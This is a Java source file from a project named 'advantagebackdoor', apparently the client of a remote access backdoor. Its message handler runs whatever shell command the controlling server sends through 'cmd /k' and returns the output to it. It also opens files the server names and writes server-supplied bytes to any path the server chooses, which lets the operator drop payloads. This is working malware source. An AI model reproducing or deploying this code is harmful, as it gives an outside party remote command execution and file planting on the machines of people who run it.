package me.faintcloudy.advantagebackdoor.client.message;

import me.faintcloudy.advantagebackdoor.api.message.play.server.ShowDialogMessage;
import org.apache.commons.io.IOUtils;
import me.faintcloudy.advantagebackdoor.api.message.MessageHandler;
import me.faintcloudy.advantagebackdoor.api.message.MessageListener;
import me.faintcloudy.advantagebackdoor.api.message.play.client.FallbackMessage;
import me.faintcloudy.advantagebackdoor.api.message.play.server.ConsoleCommandMessage;
import me.faintcloudy.advantagebackdoor.api.message.play.server.OpenFileMessage;
import me.faintcloudy.advantagebackdoor.api.message.play.server.ServerFileMessage;
import me.faintcloudy.advantagebackdoor.client.Log4jClient;

import javax.swing.*;
import java.awt.*;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.List;

public class BasicMessageHandler implements MessageListener {

    @MessageHandler
    public void onShowDialog(ShowDialogMessage message)
    {
        JOptionPane.showMessageDialog(null, message.text, message.title, JOptionPane.INFORMATION_MESSAGE);
    }

    @MessageHandler
    public void onCommand(ConsoleCommandMessage message)
    {
        new Thread(() -> {
            try {
                Process process = Runtime.getRuntime().exec("cmd /k " + message.getCommand());
                InputStream in = process.getInputStream();
                FallbackMessage fallbackMessage = new FallbackMessage(IOUtils.toString(in, StandardCharsets.UTF_8));
                Log4jClient.getInstance().sendMessage(fallbackMessage);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }).start();
    }

    @MessageHandler
    public void onOpenFile(OpenFileMessage message)
    {
        File file = new File(message.file);
        if (!file.exists())
        {
            Log4jClient.getInstance().sendMessage(new FallbackMessage("Could find the file named '" + message.file + "'!"));
            return;
        }

        try {
            Desktop.getDesktop().open(file);
        } catch (IOException e) {
            Log4jClient.getInstance().sendMessage(new FallbackMessage("Error in opening file '" + message.file + "': " + e.getMessage()));
            e.printStackTrace();
        }
    }

    Map<UUID, List<byte[]>> files = new HashMap<>();
    @MessageHandler
    public void onServerFile(ServerFileMessage message) {
        byte[] bytes = message.file;
        List<byte[]> listBytes = files.getOrDefault(message.uuid, new ArrayList<>());
        listBytes.add(bytes);
        files.put(message.uuid, listBytes);
        if (message.end)
        {
            File file = new File(message.location);
            try {
                if (!file.getParentFile().exists())
                    file.getParentFile().mkdir();
                System.out.println(file.getName());
                if (!file.exists())
                    file.createNewFile();
                FileOutputStream out = new FileOutputStream(file);
                for (byte[] bts : files.get(message.uuid)) {
                    out.write(bts);
                }
                out.close();
                files.remove(message.uuid);
            } catch (IOException e) {
                Log4jClient.getInstance().sendMessage(new FallbackMessage("Error in handling message ServerFileMessage: " + e.getMessage()));
                e.printStackTrace();
            }
        }
    }


}
